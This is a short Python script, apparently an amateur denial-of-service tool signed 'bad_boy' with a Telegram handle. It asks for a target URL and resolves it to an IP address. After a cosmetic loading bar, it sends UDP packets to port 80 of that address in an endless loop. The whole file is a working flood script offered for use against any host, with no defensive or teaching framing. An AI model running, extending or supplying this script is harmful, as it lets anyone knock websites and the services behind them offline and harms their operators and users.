import time
import socket
import os
os.system("clear")
os.system("figlet DDOS ")
print("==================================")
print("         made by bad_boy          ")
print(" my telegram id: @Bad_boy_468     ")
print("==================================")
target = input("Enter Target url : ")
ip = socket.gethostbyname(target)
port = 80
joker = "DDOS"
os.system("clear")
os.system("figlet Loading")
print("Loading{~~~   }5%")
time.sleep(3)
print("Loading{~~~~~  }10%")
time.sleep(3)
print("Loading{~~~~~~~~  }40%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~ }90%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~~~}100%")
os.system("clear")
os.system("figlet Attack_Starting")
while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(bytes(joker,"UTF-8"), (ip,port))
    print(port ,"<==packet send to==>", ip)
